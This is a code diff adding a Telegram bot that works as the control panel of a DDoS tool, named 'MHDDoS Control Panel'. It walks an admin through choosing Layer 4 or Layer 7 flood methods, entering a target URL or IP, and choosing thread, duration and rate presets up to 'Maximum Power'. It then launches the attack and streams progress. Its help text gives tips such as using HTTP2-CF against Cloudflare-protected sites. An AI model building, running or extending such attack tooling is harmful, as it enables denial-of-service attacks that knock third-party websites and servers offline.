@@ -1,0 +1,1094 @@
+import { Telegraf, Markup, Scenes, session } from 'telegraf';
+import { readFileSync, existsSync } from 'fs';
+import { logger } from '../utils/logger.js';
+import { AttackManager } from '../core/attack-manager.js';
+import { ProxyManager } from '../utils/proxy-manager.js';
+import { LAYER4_METHODS } from '../methods/layer4/index.js';
+import { LAYER7_METHODS } from '../methods/layer7/index.js';
+import { Tools } from '../utils/tools.js';
+
+/**
+ * Modern Telegram Bot with Interactive UI
+ */
+export class TelegramBot {
+    constructor(token, adminId, config) {
+        this.bot = new Telegraf(token);
+        this.adminId = adminId.toString();
+        this.config = config;
+        this.attackManager = null;
+        this.statsInterval = null;
+        this.lastMessageContent = null; // Track last message content to prevent duplicate edits
+        
+        this.setupWizard();
+        this.setupCommands();
+        this.setupCallbacks();
+    }
+
+    /**
+     * Setup Attack Wizard Scene
+     */
+    setupWizard() {
+        // Attack Wizard Scene
+        const attackWizard = new Scenes.WizardScene(
+            'attack-wizard',
+            // Step 1: Choose Layer
+            (ctx) => {
+                logger.bot(`User ${ctx.from.id} (${ctx.from.username}) entered attack wizard`);
+                ctx.reply(
+                    '🎯 *Choose Attack Layer*\n\n' +
+                    'Select the type of attack you want to perform:',
+                    {
+                        parse_mode: 'Markdown',
+                        ...Markup.inlineKeyboard([
+                            [
+                                Markup.button.callback('🌐 Layer 7 (HTTP)', 'layer_7'),
+                                Markup.button.callback('⚡ Layer 4 (TCP/UDP)', 'layer_4')
+                            ],
+                            [Markup.button.callback('❌ Cancel', 'cancel')]
+                        ])
+                    }
+                );
+                return ctx.wizard.next();
+            },
+            // Step 2: Choose Method
+            async (ctx) => {
+                if (!ctx.callbackQuery) return;
+                
+                await ctx.answerCbQuery();
+                const layer = ctx.callbackQuery.data;
+                ctx.wizard.state.layer = layer;
+
+                let methods = layer === 'layer_7' ? LAYER7_METHODS : LAYER4_METHODS;
+                
+                // Create method buttons (3 per row)
+                const methodButtons = [];
+                for (let i = 0; i < methods.length; i += 3) {
+                    const row = methods.slice(i, i + 3).map(method => 
+                        Markup.button.callback(method, `method_${method}`)
+                    );
+                    methodButtons.push(row);
+                }
+                methodButtons.push([Markup.button.callback('⬅️ Back', 'back'), Markup.button.callback('❌ Cancel', 'cancel')]);
+
+                ctx.editMessageText(
+                    `🔧 *Choose Attack Method*\n\n` +
+                    `Layer: ${layer === 'layer_7' ? 'Layer 7 (HTTP)' : 'Layer 4 (Network)'}\n\n` +
+                    'Select your preferred attack method:',
+                    {
+                        parse_mode: 'Markdown',
+                        ...Markup.inlineKeyboard(methodButtons)
+                    }
+                );
+                
+                return ctx.wizard.next();
+            },
+            // Step 3: Enter Target
+            async (ctx) => {
+                if (!ctx.callbackQuery) return;
+                
+                await ctx.answerCbQuery();
+                const method = ctx.callbackQuery.data.replace('method_', '');
+                ctx.wizard.state.method = method;
+
+                const targetFormat = ctx.wizard.state.layer === 'layer_7' 
+                    ? 'https://example.com' 
+                    : 'ip:port (e.g., 1.2.3.4:80)';
+
+                ctx.editMessageText(
+                    `🎯 *Enter Target*\n\n` +
+                    `Method: \`${method}\`\n\n` +
+                    `Please enter the target:\n` +
+                    `Format: \`${targetFormat}\`\n\n` +
+                    `Example: ${targetFormat === 'https://example.com' ? '`https://target.com`' : '`192.168.1.1:80`'}`,
+                    { parse_mode: 'Markdown' }
+                );
+                
+                return ctx.wizard.next();
+            },
+            // Step 4: Get Target Input
+            (ctx) => {
+                if (ctx.callbackQuery) return;
+                
+                // Check if user sent a command instead
+                if (ctx.message.text.startsWith('/')) {
+                    logger.bot(`User ${ctx.from.id} sent command '${ctx.message.text}' during wizard, exiting...`);
+                    ctx.reply('⚠️ Command detected. Exiting wizard...');
+                    return ctx.scene.leave();
+                }
+                
+                const target = ctx.message.text;
+                ctx.wizard.state.target = target;
+                
+                logger.bot(`User ${ctx.from.id} set target: ${target}`);
+
+                ctx.reply(
+                    `⚙️ *Configure Attack*\n\n` +
+                    `Target: \`${target}\`\n` +
+                    `Method: \`${ctx.wizard.state.method}\`\n\n` +
+                    `Choose your configuration or use recommended settings:`,
+                    {
+                        parse_mode: 'Markdown',
+                        ...Markup.inlineKeyboard([
+                            [Markup.button.callback('⚡ Quick Attack (Recommended)', 'preset_quick')],
+                            [Markup.button.callback('💪 Powerful Attack', 'preset_powerful')],
+                            [Markup.button.callback('🔥 Maximum Power', 'preset_max')],
+                            [Markup.button.callback('⚙️ Custom Settings', 'preset_custom')],
+                            [Markup.button.callback('⬅️ Back', 'back'), Markup.button.callback('❌ Cancel', 'cancel')]
+                        ])
+                    }
+                );
+                
+                return ctx.wizard.next();
+            },
+            // Step 5: Handle Preset or Custom
+            async (ctx) => {
+                if (!ctx.callbackQuery) return;
+                
+                await ctx.answerCbQuery();
+                const preset = ctx.callbackQuery.data.replace('preset_', '');
+                
+                let threads, duration, rpc;
+                
+                switch (preset) {
+                    case 'quick':
+                        threads = 100;
+                        duration = 60;
+                        rpc = 1;
+                        break;
+                    case 'powerful':
+                        threads = 300;
+                        duration = 180;
+                        rpc = 5;
+                        break;
+                    case 'max':
+                        threads = 500;
+                        duration = 300;
+                        rpc = 10;
+                        break;
+                    case 'custom':
+                        ctx.editMessageText(
+                            '⚙️ *Custom Settings*\n\n' +
+                            'Please enter settings in this format:\n' +
+                            '`threads duration rpc`\n\n' +
+                            'Example: `200 120 5`\n\n' +
+                            'Threads: 50-1000\n' +
+                            'Duration: 30-600 seconds\n' +
+                            'RPC: 1-20',
+                            { parse_mode: 'Markdown' }
+                        );
+                        return ctx.wizard.next(); // Go to custom input
+                }
+
+                ctx.wizard.state.threads = threads;
+                ctx.wizard.state.duration = duration;
+                ctx.wizard.state.rpc = rpc;
+
+                this.showAttackSummary(ctx);
+                return ctx.wizard.next(); // Skip custom input
+            },
+            // Step 6: Custom Input (optional)
+            async (ctx) => {
+                // If this is a callback (user clicked button on attack summary), pass to next step
+                if (ctx.callbackQuery) {
+                    logger.bot(`User ${ctx.from.id} clicked confirmation button, moving to confirmation handler`);
+                    return ctx.wizard.next();
+                }
+                
+                // Check if user sent a command instead
+                if (ctx.message.text.startsWith('/')) {
+                    logger.bot(`User ${ctx.from.id} sent command '${ctx.message.text}' during custom settings, exiting...`);
+                    ctx.reply('⚠️ Command detected. Exiting wizard...');
+                    return ctx.scene.leave();
+                }
+                
+                const parts = ctx.message.text.split(' ');
+                if (parts.length !== 3) {
+                    ctx.reply('❌ Invalid format! Please use: `threads duration rpc`', { parse_mode: 'Markdown' });
+                    return;
+                }
+
+                const [threads, duration, rpc] = parts.map(Number);
+                
+                if (threads < 50 || threads > 1000 || duration < 30 || duration > 600 || rpc < 1 || rpc > 20) {
+                    ctx.reply('❌ Values out of range!\n\nThreads: 50-1000\nDuration: 30-600\nRPC: 1-20');
+                    return;
+                }
+
+                ctx.wizard.state.threads = threads;
+                ctx.wizard.state.duration = duration;
+                ctx.wizard.state.rpc = rpc;
+
+                this.showAttackSummary(ctx);
+                return ctx.wizard.next();
+            },
+            // Step 7: Confirmation
+            async (ctx) => {
+                // Handle text messages (commands) during confirmation
+                if (ctx.message && ctx.message.text) {
+                    if (ctx.message.text.startsWith('/')) {
+                        logger.bot(`User ${ctx.from.id} sent command '${ctx.message.text}' during confirmation`);
+                        await ctx.reply('⚠️ Please use the buttons to confirm or cancel the attack.\n\nUse the ❌ Cancel button to exit.');
+                        return; // Stay in same step
+                    }
+                    return; // Ignore other text
+                }
+                
+                if (!ctx.callbackQuery) return;
+                
+                const action = ctx.callbackQuery.data;
+                
+                if (action === 'confirm_attack') {
+                    logger.bot(`User ${ctx.from.id} confirmed attack`);
+                    logger.attack(`Attack initiated by user ${ctx.from.id}: ${JSON.stringify(ctx.wizard.state)}`);
+                    
+                    // Answer callback query first to remove loading state
+                    await ctx.answerCbQuery('⚡ Starting attack...');
+                    
+                    // Start attack immediately (pass the wizard state before leaving)
+                    const wizardState = { ...ctx.wizard.state };
+                    
+                    // Leave scene before starting attack to prevent blocking
+                    await ctx.scene.leave();
+                    
+                    // Start attack with saved state (non-blocking)
+                    await this.startAttackFromWizard(ctx, wizardState);
+                    return;
+                } else if (action === 'cancel') {
+                    logger.bot(`User ${ctx.from.id} cancelled attack wizard`);
+                    await ctx.answerCbQuery('❌ Cancelled');
+                    await ctx.editMessageText('❌ Attack cancelled.');
+                    return ctx.scene.leave();
+                }
+                
+                return ctx.scene.leave();
+            }
+        );
+
+        // Create stage and register scene
+        const stage = new Scenes.Stage([attackWizard]);
+        
+        this.bot.use(session());
+        this.bot.use(stage.middleware());
+    }
+
+    /**
+     * Show Attack Summary
+     */
+    showAttackSummary(ctx) {
+        const state = ctx.wizard.state;
+        
+        ctx.editMessageText(
+            `📋 *Attack Summary*\n\n` +
+            `🎯 Target: \`${state.target}\`\n` +
+            `🔧 Method: \`${state.method}\`\n` +
+            `⚡ Threads: \`${state.threads}\`\n` +
+            `⏱ Duration: \`${state.duration}s\`\n` +
+            `🔄 RPC: \`${state.rpc}\`\n\n` +
+            `Are you sure you want to start this attack?`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [
+                        Markup.button.callback('✅ Confirm & Start', 'confirm_attack'),
+                        Markup.button.callback('❌ Cancel', 'cancel')
+                    ]
+                ])
+            }
+        );
+    }
+
+    /**
+     * Start Attack from Wizard
+     */
+    async startAttackFromWizard(ctx, wizardState) {
+        const state = wizardState;
+        
+        let loadingMsg;
+        try {
+            loadingMsg = await ctx.editMessageText(
+                '🔄 *Initializing Attack...*\n\n' +
+                'Please wait while we prepare the attack...',
+                { parse_mode: 'Markdown' }
+            );
+        } catch (e) {
+            // If edit fails, send new message
+            loadingMsg = await ctx.reply(
+                '🔄 *Initializing Attack...*\n\n' +
+                'Please wait while we prepare the attack...',
+                { parse_mode: 'Markdown' }
+            );
+        }
+
+        try {
+            // Load user agents and referers
+            let userAgents = [];
+            let referers = [];
+
+            if (LAYER7_METHODS.includes(state.method)) {
+                try {
+                    const uaPath = './files/useragent.txt';
+                    const refPath = './files/referers.txt';
+
+                    if (existsSync(uaPath)) {
+                        userAgents = readFileSync(uaPath, 'utf-8').split('\n').filter(l => l.trim());
+                    }
+                    if (existsSync(refPath)) {
+                        referers = readFileSync(refPath, 'utf-8').split('\n').filter(l => l.trim());
+                    }
+                } catch (e) {
+                    // Silent fail
+                }
+            }
+
+            // Create attack manager
+            this.attackManager = new AttackManager({
+                target: state.target,
+                method: state.method,
+                threads: state.threads,
+                duration: state.duration,
+                rpc: state.rpc,
+                proxies: null,
+                userAgents: userAgents,
+                referers: referers
+            });
+
+            logger.attack(`Starting attack - Target: ${state.target}, Method: ${state.method}, Threads: ${state.threads}, Duration: ${state.duration}s`);
+
+            // Start attack (non-blocking)
+            await this.attackManager.start();
+            
+            logger.attack('Attack successfully started');
+
+            // Small delay to ensure attack threads are starting
+            await new Promise(resolve => setTimeout(resolve, 100));
+
+            // Send attack started message with image
+            const imagePath = './files/image.jpg';
+            const attackMessage = `⚡ *Attack Started!*\n\n` +
+                `🎯 Target: \`${state.target}\`\n` +
+                `🔧 Method: \`${state.method}\`\n` +
+                `⚡ Threads: \`${state.threads}\`\n` +
+                `⏱ Duration: \`${state.duration}s\`\n\n` +
+                `Use /status to check progress\n` +
+                `Use /stop to stop the attack`;
+            
+            let statusMessageId = loadingMsg.message_id;
+            
+            try {
+                // Try to delete the loading message first
+                try {
+                    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
+                } catch (e) {
+                    // Ignore if can't delete
+                }
+                
+                // Send new message with image if available
+                if (existsSync(imagePath)) {
+                    const photoMsg = await ctx.telegram.sendPhoto(
+                        ctx.chat.id,
+                        { source: imagePath },
+                        {
+                            caption: attackMessage,
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [
+                                    Markup.button.callback('📊 Status', 'status'),
+                                    Markup.button.callback('🛑 Stop', 'stop')
+                                ]
+                            ])
+                        }
+                    );
+                    statusMessageId = photoMsg.message_id;
+                } else {
+                    // Fallback to edit text if no image
+                    await ctx.telegram.editMessageText(
+                        ctx.chat.id,
+                        loadingMsg.message_id,
+                        null,
+                        attackMessage,
+                        {
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [
+                                    Markup.button.callback('📊 Status', 'status'),
+                                    Markup.button.callback('🛑 Stop', 'stop')
+                                ]
+                            ])
+                        }
+                    );
+                }
+            } catch (error) {
+                logger.error('Error sending attack started message:', error);
+                // Try to update existing message as fallback
+                try {
+                    await ctx.telegram.editMessageText(
+                        ctx.chat.id,
+                        loadingMsg.message_id,
+                        null,
+                        attackMessage,
+                        {
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [
+                                    Markup.button.callback('📊 Status', 'status'),
+                                    Markup.button.callback('🛑 Stop', 'stop')
+                                ]
+                            ])
+                        }
+                    );
+                } catch (e) {
+                    // If all fails, send new message
+                    const newMsg = await ctx.telegram.sendMessage(
+                        ctx.chat.id,
+                        attackMessage,
+                        {
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [
+                                    Markup.button.callback('📊 Status', 'status'),
+                                    Markup.button.callback('🛑 Stop', 'stop')
+                                ]
+                            ])
+                        }
+                    );
+                    statusMessageId = newMsg.message_id;
+                }
+            }
+
+            // Start monitoring with the correct message ID
+            this.startMonitoring(ctx.chat.id, statusMessageId);
+
+        } catch (error) {
+            logger.error('Error starting attack:', error);
+            logger.attack(`Failed to start attack for user ${ctx.from.id}: ${error.message}`);
+            try {
+                await ctx.telegram.editMessageText(
+                    ctx.chat.id,
+                    loadingMsg.message_id,
+                    null,
+                    `❌ *Error Starting Attack*\n\n${error.message}`,
+                    { parse_mode: 'Markdown' }
+                );
+            } catch (e) {
+                // If edit fails, send new message
+                await ctx.telegram.sendMessage(
+                    ctx.chat.id,
+                    `❌ *Error Starting Attack*\n\n${error.message}`,
+                    { parse_mode: 'Markdown' }
+                );
+            }
+        }
+    }
+
+    /**
+     * Start Real-time Monitoring
+     */
+    startMonitoring(chatId, messageId) {
+        // Clear existing monitoring interval to prevent multiple intervals
+        if (this.statsInterval) {
+            clearInterval(this.statsInterval);
+            this.statsInterval = null;
+        }
+
+        this.statsInterval = setInterval(async () => {
+            try {
+                if (!this.attackManager || !this.attackManager.isActive()) {
+                    clearInterval(this.statsInterval);
+                    this.statsInterval = null;
+                    
+                    const completionMessage = `✅ *Attack Completed!*\n\n` +
+                        `The attack has finished successfully.`;
+                    
+                    // Only update if message content has changed
+                    if (this.lastMessageContent !== completionMessage) {
+                        try {
+                            await this.bot.telegram.editMessageText(
+                                chatId,
+                                messageId,
+                                null,
+                                completionMessage,
+                                {
+                                    parse_mode: 'Markdown',
+                                    ...Markup.inlineKeyboard([
+                                        [Markup.button.callback('🔄 New Attack', 'new_attack')]
+                                    ])
+                                }
+                            );
+                            this.lastMessageContent = completionMessage;
+                        } catch (e) {
+                            if (!e.message.includes('not modified')) {
+                                logger.debug('Failed to update completion message:', e.message);
+                            }
+                        }
+                    }
+                    
+                    return;
+                }
+
+                const stats = this.attackManager.getStats();
+                const progress = Math.min(100, Math.floor((stats.elapsed / stats.duration) * 100));
+                const progressBar = this.createProgressBar(progress);
+
+                const statusMessage = 
+                    `⚡ *Attack in Progress*\n\n` +
+                    `🎯 Target: \`${stats.target}\`\n` +
+                    `🔧 Method: \`${stats.method}\`\n\n` +
+                    `📊 Progress: ${progressBar} ${progress}%\n` +
+                    `📤 Requests: \`${stats.requestsSent}\`\n` +
+                    `📦 Data Sent: \`${stats.bytesSent}\`\n` +
+                    `⏱ Time: \`${stats.elapsed}s / ${stats.duration}s\`\n\n` +
+                    `Status: 🟢 Running`;
+
+                // Only update if message content has changed
+                if (this.lastMessageContent !== statusMessage) {
+                    try {
+                        await this.bot.telegram.editMessageText(
+                            chatId,
+                            messageId,
+                            null,
+                            statusMessage,
+                            {
+                                parse_mode: 'Markdown',
+                                ...Markup.inlineKeyboard([
+                                    [
+                                        Markup.button.callback('🔄 Refresh', 'status'),
+                                        Markup.button.callback('🛑 Stop', 'stop')
+                                    ]
+                                ])
+                            }
+                        );
+                        this.lastMessageContent = statusMessage;
+                    } catch (e) {
+                        // Message not modified or rate limited, skip silently
+                        if (!e.message.includes('not modified')) {
+                            logger.debug('Failed to update stats message:', e.message);
+                        }
+                    }
+                }
+            } catch (error) {
+                logger.error('Monitoring error:', error);
+                // Clear interval on error to prevent spam
+                clearInterval(this.statsInterval);
+                this.statsInterval = null;
+            }
+        }, 3000);
+    }
+
+    /**
+     * Create Progress Bar
+     */
+    createProgressBar(progress) {
+        const filled = Math.floor(progress / 10);
+        const empty = 10 - filled;
+        return '█'.repeat(filled) + '░'.repeat(empty);
+    }
+
+    /**
+     * Setup Commands
+     */
+    setupCommands() {
+        // Start command
+        this.bot.start(async (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            
+            logger.bot(`User ${ctx.from.id} (${ctx.from.username}) used /start command`);
+            
+            // Check if user is currently in a scene/wizard
+            if (ctx.scene && ctx.scene.current) {
+                ctx.reply(
+                    '⚠️ *You are already in the attack wizard!*\n\n' +
+                    'Please complete the current wizard or use the ❌ Cancel button to exit first.',
+                    { parse_mode: 'Markdown' }
+                );
+                return;
+            }
+            
+            const imagePath = './files/image.jpg';
+            const message = `🚀 *Welcome to MHDDoS Control Panel*\n\n` +
+                `Version: \`3.0.0\`\n` +
+                `Status: 🟢 Online\n\n` +
+                `Select an option below to get started:`;
+            
+            try {
+                // Try to send with image
+                if (existsSync(imagePath)) {
+                    await ctx.replyWithPhoto(
+                        { source: imagePath },
+                        {
+                            caption: message,
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [Markup.button.callback('⚡ Start Attack', 'new_attack')],
+                                [Markup.button.callback('📊 Check Status', 'status')],
+                                [Markup.button.callback('🔧 Methods List', 'methods')],
+                                [Markup.button.callback('❓ Help', 'help')]
+                            ])
+                        }
+                    );
+                } else {
+                    // Fallback to text-only if image not found
+                    logger.warning('image.jpg not found, sending text-only message');
+                    await ctx.reply(
+                        message,
+                        {
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [Markup.button.callback('⚡ Start Attack', 'new_attack')],
+                                [Markup.button.callback('📊 Check Status', 'status')],
+                                [Markup.button.callback('🔧 Methods List', 'methods')],
+                                [Markup.button.callback('❓ Help', 'help')]
+                            ])
+                        }
+                    );
+                }
+            } catch (error) {
+                logger.error('Error sending start message with image:', error);
+                // Fallback to text-only on error
+                await ctx.reply(
+                    message,
+                    {
+                        parse_mode: 'Markdown',
+                        ...Markup.inlineKeyboard([
+                            [Markup.button.callback('⚡ Start Attack', 'new_attack')],
+                            [Markup.button.callback('📊 Check Status', 'status')],
+                            [Markup.button.callback('🔧 Methods List', 'methods')],
+                            [Markup.button.callback('❓ Help', 'help')]
+                        ])
+                    }
+                );
+            }
+        });
+
+        // Menu command (alias for start)
+        this.bot.command('menu', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            
+            // Check if user is currently in a scene/wizard
+            if (ctx.scene && ctx.scene.current) {
+                ctx.reply(
+                    '⚠️ *You are already in the attack wizard!*\n\n' +
+                    'Please complete the current wizard or use the ❌ Cancel button to exit first.',
+                    { parse_mode: 'Markdown' }
+                );
+                return;
+            }
+            
+            ctx.reply(
+                `🚀 *Welcome to MHDDoS Control Panel*\n\n` +
+                `Version: \`3.0.0\`\n` +
+                `Status: 🟢 Online\n\n` +
+                `Select an option below to get started:`,
+                {
+                    parse_mode: 'Markdown',
+                    ...Markup.inlineKeyboard([
+                        [Markup.button.callback('⚡ Start Attack', 'new_attack')],
+                        [Markup.button.callback('📊 Check Status', 'status')],
+                        [Markup.button.callback('🔧 Methods List', 'methods')],
+                        [Markup.button.callback('❓ Help', 'help')]
+                    ])
+                }
+            );
+        });
+
+        // Stop command
+        this.bot.command('stop', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            logger.bot(`User ${ctx.from.id} used /stop command`);
+            this.handleStop(ctx);
+        });
+
+        // Status command
+        this.bot.command('status', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            logger.bot(`User ${ctx.from.id} used /status command`);
+            this.handleStatus(ctx);
+        });
+
+        // Methods command
+        this.bot.command('methods', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            this.handleMethods(ctx);
+        });
+
+        // Help command
+        this.bot.command('help', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            this.handleHelp(ctx);
+        });
+
+        // Redirect /confirm command to use buttons
+        this.bot.command('confirm', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            ctx.reply(
+                '⚠️ *Please use the buttons instead of commands!*\n\n' +
+                'The `/confirm` command is not available.\n' +
+                'Use the ✅ *Confirm & Start* button shown in the attack summary.',
+                { parse_mode: 'Markdown' }
+            );
+        });
+
+        // Redirect /cancel command to use buttons
+        this.bot.command('cancel', (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            ctx.reply(
+                '⚠️ *Please use the buttons instead of commands!*\n\n' +
+                'The `/cancel` command is not available.\n' +
+                'Use the ❌ *Cancel* button to exit the wizard.',
+                { parse_mode: 'Markdown' }
+            );
+        });
+    }
+
+    /**
+     * Setup Callback Handlers
+     */
+    setupCallbacks() {
+        // New Attack
+        this.bot.action('new_attack', async (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            await ctx.answerCbQuery();
+            await ctx.scene.enter('attack-wizard');
+        });
+
+        // Status
+        this.bot.action('status', async (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            await this.handleStatus(ctx, true);
+        });
+
+        // Stop
+        this.bot.action('stop', async (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            await this.handleStop(ctx, true);
+        });
+
+        // Methods
+        this.bot.action('methods', async (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            await this.handleMethods(ctx, true);
+        });
+
+        // Help
+        this.bot.action('help', async (ctx) => {
+            if (!this.isAdmin(ctx)) return;
+            await this.handleHelp(ctx, true);
+        });
+
+        // Cancel
+        this.bot.action('cancel', async (ctx) => {
+            await ctx.answerCbQuery('❌ Cancelled');
+            await ctx.editMessageText('❌ Operation cancelled.');
+            await ctx.scene.leave();
+        });
+
+        // Back button
+        this.bot.action('back', async (ctx) => {
+            try {
+                await ctx.answerCbQuery();
+                if (ctx.wizard) {
+                    ctx.wizard.back();
+                    await ctx.wizard.steps[ctx.wizard.cursor](ctx);
+                } else {
+                    await ctx.editMessageText('❌ Navigation error. Please start over with /start');
+                }
+            } catch (e) {
+                logger.error('Back button error:', e);
+                await ctx.answerCbQuery('❌ Error');
+            }
+        });
+    }
+
+    /**
+     * Handle Stop
+     */
+    async handleStop(ctx, isCallback = false) {
+        try {
+            if (isCallback) {
+                await ctx.answerCbQuery();
+            }
+            
+            if (this.attackManager && this.attackManager.isActive()) {
+                logger.attack('Stopping attack...');
+                this.attackManager.stop();
+                
+                if (this.statsInterval) {
+                    clearInterval(this.statsInterval);
+                    this.statsInterval = null;
+                }
+
+                logger.attack('Attack stopped successfully');
+                const message = '🛑 *Attack Stopped*\n\nThe attack has been stopped successfully.';
+                
+                if (isCallback) {
+                    await ctx.editMessageText(message, { parse_mode: 'Markdown' });
+                } else {
+                    await ctx.reply(message, { parse_mode: 'Markdown' });
+                }
+            } else {
+                const message = '⚠️ No active attack to stop.';
+                
+                if (isCallback) {
+                    try {
+                        await ctx.editMessageText(message);
+                    } catch (e) {
+                        // If can't edit, just notify via callback query (already answered above)
+                        logger.debug('Could not edit message:', e.message);
+                    }
+                } else {
+                    await ctx.reply(message);
+                }
+            }
+        } catch (error) {
+            logger.error('Error in handleStop:', error);
+            const errorMsg = '❌ Error stopping attack. Please try again.';
+            if (isCallback) {
+                try {
+                    await ctx.editMessageText(errorMsg);
+                } catch (e) {
+                    await ctx.reply(errorMsg);
+                }
+            } else {
+                await ctx.reply(errorMsg);
+            }
+        }
+    }
+
+    /**
+     * Handle Status
+     */
+    async handleStatus(ctx, isCallback = false) {
+        try {
+            if (isCallback) {
+                await ctx.answerCbQuery();
+            }
+            
+            if (this.attackManager && this.attackManager.isActive()) {
+                const stats = this.attackManager.getStats();
+                const progress = Math.min(100, Math.floor((stats.elapsed / stats.duration) * 100));
+                const progressBar = this.createProgressBar(progress);
+
+                const message = 
+                    `⚡ *Attack Status*\n\n` +
+                    `🎯 Target: \`${stats.target}\`\n` +
+                    `🔧 Method: \`${stats.method}\`\n` +
+                    `⚡ Threads: \`${stats.threads}\`\n\n` +
+                    `📊 Progress: ${progressBar} ${progress}%\n` +
+                    `📤 Requests: \`${stats.requestsSent}\`\n` +
+                    `📦 Data: \`${stats.bytesSent}\`\n` +
+                    `⏱ Time: \`${stats.elapsed}s / ${stats.duration}s\``;
+
+                if (isCallback) {
+                    await ctx.editMessageText(message, 
+                        {
+                            parse_mode: 'Markdown',
+                            ...Markup.inlineKeyboard([
+                                [Markup.button.callback('🔄 Refresh', 'status'), Markup.button.callback('🛑 Stop', 'stop')]
+                            ])
+                        }
+                    );
+                } else {
+                    await ctx.reply(message, { parse_mode: 'Markdown' });
+                }
+            } else {
+                const message = '⚠️ No active attack.';
+                
+                if (isCallback) {
+                    try {
+                        await ctx.editMessageText(message);
+                    } catch (e) {
+                        // Already answered callback query above
+                        logger.debug('Could not edit message:', e.message);
+                    }
+                } else {
+                    await ctx.reply(message);
+                }
+            }
+        } catch (error) {
+            logger.error('Error in handleStatus:', error);
+            const errorMsg = '❌ Error getting status. Please try again.';
+            if (isCallback) {
+                try {
+                    await ctx.editMessageText(errorMsg);
+                } catch (e) {
+                    await ctx.reply(errorMsg);
+                }
+            } else {
+                await ctx.reply(errorMsg);
+            }
+        }
+    }
+
+    /**
+     * Handle Methods
+     */
+    async handleMethods(ctx, isCallback = false) {
+        try {
+            if (isCallback) {
+                await ctx.answerCbQuery();
+            }
+            const message = 
+                `📋 *Available Attack Methods*\n\n` +
+                `*🌐 Layer 7 (HTTP):*\n` +
+                `\`${LAYER7_METHODS.slice(0, 10).join(', ')}\`\n` +
+                `and ${LAYER7_METHODS.length - 10} more...\n\n` +
+                `*⚡ Layer 4 (Network):*\n` +
+                `\`${LAYER4_METHODS.join(', ')}\`\n\n` +
+                `Total: ${LAYER4_METHODS.length + LAYER7_METHODS.length} methods`;
+
+            if (isCallback) {
+                await ctx.editMessageText(message, 
+                    {
+                        parse_mode: 'Markdown',
+                        ...Markup.inlineKeyboard([
+                            [Markup.button.callback('⚡ Start Attack', 'new_attack')],
+                            [Markup.button.callback('⬅️ Back', 'back')]
+                        ])
+                    }
+                );
+            } else {
+                await ctx.reply(message, { parse_mode: 'Markdown' });
+            }
+        } catch (error) {
+            logger.error('Error in handleMethods:', error);
+            const errorMsg = '❌ Error getting methods list.';
+            await ctx.reply(errorMsg).catch(() => {});
+        }
+    }
+
+    /**
+     * Handle Help
+     */
+    async handleHelp(ctx, isCallback = false) {
+        try {
+            if (isCallback) {
+                await ctx.answerCbQuery();
+            }
+            const message = 
+                `❓ *Help & Guide*\n\n` +
+                `*Quick Start:*\n` +
+                `1️⃣ Click "Start Attack" button\n` +
+                `2️⃣ Choose Layer 7 or Layer 4\n` +
+                `3️⃣ Select attack method\n` +
+                `4️⃣ Enter target URL/IP\n` +
+                `5️⃣ Choose preset or custom settings\n` +
+                `6️⃣ Confirm and start!\n\n` +
+                `*Tips:*\n` +
+                `• Layer 7 for websites (http/https)\n` +
+                `• Layer 4 for servers (ip:port)\n` +
+                `• Use HTTP2-CF for Cloudflare sites\n` +
+                `• Higher threads = more power\n\n` +
+                `*Commands:*\n` +
+                `/start - Main menu\n` +
+                `/status - Check attack status\n` +
+                `/stop - Stop current attack\n` +
+                `/methods - List all methods\n` +
+                `/help - Show this help\n\n` +
+                `💡 *Tip:* Use the interactive buttons instead of typing commands!`;
+
+            if (isCallback) {
+                await ctx.editMessageText(message, 
+                    {
+                        parse_mode: 'Markdown',
+                        ...Markup.inlineKeyboard([
+                            [Markup.button.callback('⬅️ Back', 'back')]
+                        ])
+                    }
+                );
+            } else {
+                await ctx.reply(message, { parse_mode: 'Markdown' });
+            }
+        } catch (error) {
+            logger.error('Error in handleHelp:', error);
+            const errorMsg = '❌ Error getting help information.';
+            await ctx.reply(errorMsg).catch(() => {});
+        }
+    }
+
+    /**
+     * Check if user is admin
+     */
+    isAdmin(ctx) {
+        if (ctx.from.id.toString() !== this.adminId) {
+            logger.warning(`Unauthorized access attempt by user ${ctx.from.id} (${ctx.from.username})`);
+            ctx.reply('⛔️ *Access Denied*\n\nThis bot is private and only accessible to authorized users.', { parse_mode: 'Markdown' });
+            return false;
+        }
+        return true;
+    }
+
+    /**
+     * Launch bot
+     */
+    launch() {
+        logger.info('🤖 Starting Telegram bot...');
+        logger.bot('Telegram bot initialization started');
+        
+        // Add error handlers
+        this.bot.catch((err, ctx) => {
+            // Silently ignore "message not modified" errors - these are expected when trying to update with same content
+            if (err.message && err.message.includes('message is not modified')) {
+                return; // Skip logging and notification for this expected error
+            }
+            
+            logger.error('Bot error:', err);
+            logger.bot(`Error in update from user ${ctx.from?.id}: ${err.message}`);
+            
+            try {
+                ctx.reply('❌ An error occurred. Please try again or contact admin.').catch(() => {});
+            } catch (e) {
+                logger.error('Failed to send error message:', e);
+            }
+        });
+        
+        this.bot.launch();
+        
+        // Enable graceful stop
+        process.once('SIGINT', () => {
+            logger.bot('Received SIGINT, stopping bot...');
+            this.bot.stop('SIGINT');
+        });
+        process.once('SIGTERM', () => {
+            logger.bot('Received SIGTERM, stopping bot...');
+            this.bot.stop('SIGTERM');
+        });
+        
+        logger.success('🤖 Telegram bot is running!');
+        logger.info(`👤 Admin ID: ${this.adminId}`);
